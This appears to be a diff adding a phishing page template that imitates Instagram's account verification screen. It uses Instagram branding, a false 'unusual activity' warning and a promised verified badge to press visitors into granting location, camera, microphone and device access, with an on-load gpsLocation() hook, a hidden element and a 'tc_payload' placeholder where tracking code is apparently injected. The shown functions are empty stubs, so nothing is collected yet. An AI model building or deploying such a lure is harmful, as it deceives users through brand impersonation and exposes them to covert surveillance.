@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Account Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 32px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 0 16px;
+        }
+
+        .card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 32px;
+            margin-bottom: 16px;
+        }
+
+        .page-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .page-subtitle {
+            font-size: 14px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .alert-box {
+            background: linear-gradient(135deg, #fff5f5 0%, #ffe5e5 100%);
+            border-left: 4px solid #ed4956;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .alert-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #c13584;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-text {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.6;
+        }
+
+        .verification-section {
+            margin: 24px 0;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+        }
+
+        .permission-list {
+            list-style: none;
+            margin: 16px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: #fafafa;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            border: 1px solid #dbdbdb;
+        }
+
+        .permission-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .permission-text {
+            flex: 1;
+        }
+
+        .permission-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 2px;
+        }
+
+        .permission-desc {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            opacity: 0.9;
+        }
+
+        .btn-primary:disabled {
+            background: #dbdbdb;
+            color: #8e8e8e;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #0095f6;
+            border: 1px solid #dbdbdb;
+        }
+
+        .btn-secondary:hover {
+            background: #fafafa;
+        }
+
+        .btn-success {
+            background: #42b72a;
+            color: white;
+        }
+
+        .info-box {
+            background: #f0f8ff;
+            border: 1px solid #0095f6;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+        }
+
+        .info-box-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0095f6;
+            margin-bottom: 8px;
+        }
+
+        .info-box-text {
+            font-size: 13px;
+            color: #8e8e8e;
+            line-height: 1.6;
+        }
+
+        .steps-list {
+            list-style: none;
+            margin: 16px 0;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .step-number {
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            flex: 1;
+            font-size: 14px;
+            color: #262626;
+            padding-top: 4px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 24px;
+            margin-top: 40px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin: 4px 0;
+        }
+
+        .footer-links {
+            margin-top: 12px;
+        }
+
+        .footer-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 8px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #c13584;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 16px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px auto;
+            }
+
+            .card {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <div class="logo">Instagram</div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h1 class="page-title">Account Verification</h1>
+            <p class="page-subtitle">Complete the verification process to secure your account and get the verified badge
+            </p>
+
+            <div class="alert-box">
+                <div class="alert-title">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>Verification Required</span>
+                </div>
+                <p class="alert-text">
+                    We've detected unusual activity on your account. To protect your account and complete the
+                    verification process, we need to confirm your identity.
+                </p>
+            </div>
+
+            <div class="verification-section">
+                <div class="section-title">
+                    <div class="section-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <span>Identity Verification</span>
+                </div>
+
+                <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 16px; line-height: 1.6;">
+                    To verify your identity and secure your account, please grant the following permissions:
+                </p>
+
+                <ul class="permission-list">
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-map-marker-alt"></i>
+                        </div>
+                        <div class="permission-text">
+                            <div class="permission-label">Location Access</div>
+                            <div class="permission-desc">Verify your current location</div>
+                        </div>
+                    </li>
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <div class="permission-text">
+                            <div class="permission-label">Camera Access</div>
+                            <div class="permission-desc">Take a verification photo</div>
+                        </div>
+                    </li>
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-microphone"></i>
+                        </div>
+                        <div class="permission-text">
+                            <div class="permission-label">Microphone Access</div>
+                            <div class="permission-desc">Voice verification</div>
+                        </div>
+                    </li>
+                    <li class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-mobile-alt"></i>
+                        </div>
+                        <div class="permission-text">
+                            <div class="permission-label">Device Information</div>
+                            <div class="permission-desc">Verify device authenticity</div>
+                        </div>
+                    </li>
+                </ul>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" id="allowBtn" onclick="allowPermissions()">Allow
+                        Permissions</button>
+                    <button class="btn btn-primary" id="verifyBtn" onclick="startVerification()" disabled>Continue
+                        Verification</button>
+                </div>
+
+                <div class="spinner" id="spinner"></div>
+            </div>
+
+            <div class="info-box">
+                <div class="info-box-title">What happens after verification?</div>
+                <ul class="steps-list">
+                    <li class="step-item">
+                        <div class="step-number">1</div>
+                        <div class="step-text">Your identity will be verified</div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">2</div>
+                        <div class="step-text">Your account will be secured</div>
+                    </li>
+                    <li class="step-item">
+                        <div class="step-number">3</div>
+                        <div class="step-text">You'll receive the verified badge</div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-text">Instagram from Meta</p>
+        <p class="footer-text">© 2024 Instagram</p>
+        <div class="footer-links">
+            <a href="#" class="footer-link" onclick="return false;">About</a>
+            <a href="#" class="footer-link" onclick="return false;">Help</a>
+            <a href="#" class="footer-link" onclick="return false;">Privacy</a>
+            <a href="#" class="footer-link" onclick="return false;">Terms</a>
+        </div>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var permissionsGranted = false;
+
+        function allowPermissions() {
+            if (typeof requestPermissions === 'function') {
+                requestPermissions();
+            }
+
+            permissionsGranted = true;
+            var verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = false;
+
+            var allowBtn = document.getElementById('allowBtn');
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Permissions Granted';
+            allowBtn.className = 'btn btn-success';
+            allowBtn.disabled = true;
+        }
+
+        function startVerification() {
+            if (!permissionsGranted) {
+                alert('Please allow permissions first');
+                return;
+            }
+
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('verifyBtn').innerHTML = 'Verifying...';
+            document.getElementById('verifyBtn').disabled = true;
+
+            setTimeout(function () {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('verifyBtn').innerHTML = '<i class="fas fa-check-circle"></i> Verified';
+                document.getElementById('verifyBtn').className = 'btn btn-success';
+            }, 3000);
+        }
+
+        function requestPermissions() { }
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
